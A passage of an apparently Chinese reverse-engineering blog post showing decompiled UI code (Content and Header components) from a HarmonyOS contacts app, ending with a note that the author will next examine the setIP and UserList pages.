class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v0, types: [&amp;entry/src/main/ets/components/Content&amp;] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r23v34, types: [int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>=#Content(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;</span><br><span class="line">        obj = arg3;</span><br><span class="line">        obj2 = arg4;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3 = <span class="built_in">super</span>(arg0, arg2, obj, arg5);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&quot;function&quot;</span> == typeof(obj2) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj3.paramsGenerator_ = obj2;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3.setInitiallyProvidedValue(arg1);</span><br><span class="line">        obj3.finalizeConstruction();</span><br><span class="line">        <span class="keyword">return</span> obj3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#rerender(Object functionObject, Object newTarget, Content <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateDirtyElements();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#initialRender(Object functionObject, Object newTarget, Content <span class="built_in">this</span>) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        ldlexvar = _lexenv_0_1_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#, Column);</span><br><span class="line">        ldlexvar2 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar2.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>, GridRow);</span><br><span class="line">        ldlexvar3 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar3.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>, GridCol);</span><br><span class="line">        ldlexvar4 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar4.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>, createobjectwithbuffer([<span class="string">&quot;name&quot;</span>, <span class="string">&quot;UserList&quot;</span>]));</span><br><span class="line">        GridCol.pop();</span><br><span class="line">        GridRow.pop();</span><br><span class="line">        ldlexvar5 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar5.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">4</span>, Text);</span><br><span class="line">        Text.pop();</span><br><span class="line">        Column.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#updateStateVars(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#aboutToBeDeleted(Object functionObject, Object newTarget, Content <span class="built_in">this</span>) &#123;</span><br><span class="line">        Get = SubscriberManager.Get();</span><br><span class="line">        Get.delete(<span class="built_in">this</span>.id__());</span><br><span class="line">        <span class="built_in">this</span>.aboutToBeDeletedInternal();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>*#paramsLambda(Object functionObject, Object newTarget, Content <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> createemptyobject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#setInitiallyProvidedValue(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p001entry/src/main/ets/components;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: &amp;entry/src/main/ets/components/Header&amp;, reason: invalid class name */</span></span><br><span class="line"><span class="comment">/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Header</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object pkgName<span class="meta">@entry</span>;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object hasTopLevelAwait;</span><br><span class="line">    <span class="keyword">public</span> Object isSharedModule;</span><br><span class="line">    <span class="keyword">public</span> Object scopeNames;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #*#(Object functionObject, Object newTarget, Header <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Row.create();</span><br><span class="line">        Row.width(<span class="keyword">import</span> &#123; StyleConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/StyleConstants&amp;&quot;</span>.FULL_WIDTH);</span><br><span class="line">        obj = Row.height;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777326</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Row.zIndex(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.Z_INDEX);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = Text.create;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777236</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10003</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Text.fontWeight(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.TITLE_FONT_WEIGHT);</span><br><span class="line">        obj3 = Text.fontColor;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777245</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10001</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj3(obj4);</span><br><span class="line">        obj5 = Text.opacity;</span><br><span class="line">        obj6 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777327</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj6.params = [Object];</span><br><span class="line">        obj5(obj6);</span><br><span class="line">        Text.letterSpacing(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.LETTER_SPACING);</span><br><span class="line">        obj7 = Text.padding;</span><br><span class="line">        obj8 = createobjectwithbuffer([<span class="string">&quot;left&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj9 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777328</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj9.params = [Object];</span><br><span class="line">        obj8.left = obj9;</span><br><span class="line">        obj7(obj8);</span><br><span class="line">        Text.fontSize(<span class="string">&quot;20vp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Blank.create();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = Text.create;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777234</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10003</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Text.fontWeight(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.TITLE_FONT_WEIGHT);</span><br><span class="line">        obj3 = Text.fontColor;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777245</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10001</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj3(obj4);</span><br><span class="line">        obj5 = Text.opacity;</span><br><span class="line">        obj6 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777327</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj6.params = [Object];</span><br><span class="line">        obj5(obj6);</span><br><span class="line">        Text.letterSpacing(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.LETTER_SPACING);</span><br><span class="line">        obj7 = Text.padding;</span><br><span class="line">        obj8 = createobjectwithbuffer([<span class="string">&quot;left&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj9 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777328</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj9.params = [Object];</span><br><span class="line">        obj8.left = obj9;</span><br><span class="line">        obj7(obj8);</span><br><span class="line">        Text.onClick(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>*#);</span><br><span class="line">        Text.fontSize(<span class="string">&quot;20vp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r13v7, types: [boolean, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, Header <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (isIn(<span class="string">&quot;finalizeConstruction&quot;</span>, ViewPU.prototype) == <span class="literal">false</span>) &#123;</span><br><span class="line">            Reflect.set(ViewPU.prototype, <span class="string">&quot;finalizeConstruction&quot;</span>, #*#);</span><br><span class="line">        &#125;</span><br><span class="line">        obj = ViewPU.#~@<span class="number">0</span>=#Header(Object2, Object3, ViewPU, [<span class="string">&quot;setInitiallyProvidedValue&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Header&amp;.#~@0&gt;#setInitiallyProvidedValue&quot;</span>, <span class="number">1</span>, <span class="string">&quot;updateStateVars&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Header&amp;.#~@0&gt;#updateStateVars&quot;</span>, <span class="number">1</span>, <span class="string">&quot;purgeVariableDependenciesOnElmtId&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Header&amp;.#~@0&gt;#purgeVariableDependenciesOnElmtId&quot;</span>, <span class="number">1</span>, <span class="string">&quot;aboutToBeDeleted&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Header&amp;.#~@0&gt;#aboutToBeDeleted&quot;</span>, <span class="number">0</span>, <span class="string">&quot;initialRender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Header&amp;.#~@0&gt;#initialRender&quot;</span>, <span class="number">0</span>, <span class="string">&quot;rerender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Header&amp;.#~@0&gt;#rerender&quot;</span>, <span class="number">0</span>, <span class="number">6</span>]);</span><br><span class="line">        obj2 = obj.prototype;</span><br><span class="line">        _module_0_ = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v0, types: [&amp;entry/src/main/ets/components/Header&amp;] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r23v34, types: [int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>=#Header(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;</span><br><span class="line">        obj = arg3;</span><br><span class="line">        obj2 = arg4;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3 = <span class="built_in">super</span>(arg0, arg2, obj, arg5);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&quot;function&quot;</span> == typeof(obj2) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj3.paramsGenerator_ = obj2;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3.setInitiallyProvidedValue(arg1);</span><br><span class="line">        obj3.finalizeConstruction();</span><br><span class="line">        <span class="keyword">return</span> obj3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>*#(Object functionObject, Object newTarget, Header <span class="built_in">this</span>) &#123;</span><br><span class="line">        router = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as router &#125; from <span class="string">&quot;@ohos:router&quot;</span>;</span><br><span class="line">        pushUrl = router.pushUrl(createobjectwithbuffer([<span class="string">&quot;url&quot;</span>, <span class="string">&quot;pages/setIP&quot;</span>]));</span><br><span class="line">        pushUrl.<span class="keyword">catch</span>(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>**#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>**#(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#rerender(Object functionObject, Object newTarget, Header <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateDirtyElements();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#initialRender(Object functionObject, Object newTarget, Header <span class="built_in">this</span>) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        ldlexvar = _lexenv_0_1_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#, Row);</span><br><span class="line">        ldlexvar2 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar2.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>, Text);</span><br><span class="line">        Text.pop();</span><br><span class="line">        ldlexvar3 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar3.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>, Blank);</span><br><span class="line">        Blank.pop();</span><br><span class="line">        ldlexvar4 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar4.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>, Text);</span><br><span class="line">        Text.pop();</span><br><span class="line">        Row.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#updateStateVars(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#aboutToBeDeleted(Object functionObject, Object newTarget, Header <span class="built_in">this</span>) &#123;</span><br><span class="line">        Get = SubscriberManager.Get();</span><br><span class="line">        Get.delete(<span class="built_in">this</span>.id__());</span><br><span class="line">        <span class="built_in">this</span>.aboutToBeDeletedInternal();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#setInitiallyProvidedValue(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, Header <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续去看<code>setIP</code>和<code>Userlist</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 